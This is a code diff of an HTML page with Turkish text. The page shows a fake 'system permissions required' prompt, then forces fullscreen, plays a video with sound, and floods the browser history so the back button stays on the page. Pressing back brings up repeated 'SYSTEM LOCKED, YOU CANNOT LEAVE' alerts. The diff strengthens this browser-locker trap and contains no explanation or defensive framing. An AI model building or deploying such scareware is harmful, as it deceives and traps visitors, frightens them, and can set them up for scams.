@@ -10,6 +10,7 @@
             padding: 0;
             box-sizing: border-box;
             user-select: none;
+            -webkit-user-select: none;
         }
         body, html {
             width: 100%;
@@ -30,14 +31,13 @@
             left: 0;
             z-index: 1;
         }
-        /* Başlangıçta tam ekranı tetiklemek için sahte tıklama katmanı */
         #overlay {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.9);
+            background: rgba(0, 0, 0, 0.95);
             color: #ff0000;
             display: flex;
             flex-direction: column;
@@ -51,69 +51,53 @@
             font-size: 24px;
             margin-bottom: 15px;
             text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        #overlay p {
-            font-size: 14px;
-            color: #fff;
         }
     </style>
 </head>
-<body>
+<body onclick="forceFullscreen()">
 
     <div id="overlay" onclick="startTrap()">
         <h1>⚠️ SİSTEM İZNLERİ GEREKLİ ⚠️</h1>
-        <p>Devam etmek için ekrana herhangi bir yere dokunun.</p>
+        <p style="color: #fff;">Devam etmek için ekrana dokunun.</p>
     </div>
 
     <video id="myVideo" playsinline loop src="SnapTik.Net_7627468591947926792.mp4"></video>
 
     <script>
-        // 1. GERİ TUŞU TUZAĞI (History API Trap)
         function lockHistory() {
-            for (let i = 0; i < 20; i++) {
+            for (let i = 0; i < 50; i++) {
                 window.history.pushState(null, "", window.location.href);
             }
         }
 
         window.onpopstate = function() {
             window.history.pushState(null, "", window.location.href);
-            alert("⚠️ SİSTEM KİLİTLENDİ! BU SAYFADAN AYRILAMAZSINIZ!");
+            alert("⚠️ SİSTEM KİLİTLENDİ!");
+            alert("⚠️ SAYFADAN AYRILAMAZSINIZ!");
+            forceFullscreen();
         };
 
-        // 2. SAYFADAN AYRILMA / KAPATMA UYARISI
-        window.onbeforeunload = function() {
-            return "Sistemde kaydedilmemiş veriler var. Ayrılmak istediğinize emin misiniz?";
-        };
+        function forceFullscreen() {
+            const doc = document.documentElement;
+            if (doc.requestFullscreen) {
+                doc.requestFullscreen();
+            } else if (doc.webkitRequestFullscreen) {
+                doc.webkitRequestFullscreen();
+            }
+        }
 
-        // 3. BAŞLATMA FONKSİYONU (Sesi açar, tam ekran yapar ve döngüyü başlatır)
         function startTrap() {
-            const overlay = document.getElementById("overlay");
+            document.getElementById("overlay").style.display = "none";
             const video = document.getElementById("myVideo");
-
-            // Katmanı kaldır
-            overlay.style.display = "none";
-
-            // Videoyu sesli başlat
             video.muted = false;
             video.play();
-
-            // Tam ekran moduna zorla (Mobil cihazlar için)
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            } else if (document.documentElement.webkitRequestFullscreen) { /* Safari / Chrome mobile */
-                document.documentElement.webkitRequestFullscreen();
-            }
-
-            // Geri tuşu kilidini aktif et
+            forceFullscreen();
             lockHistory();
         }
 
-        // Sayfa yüklendiğinde geçmişi doldur
         window.onload = function() {
             lockHistory();
         };
     </script>
 </body>
 </html>
-
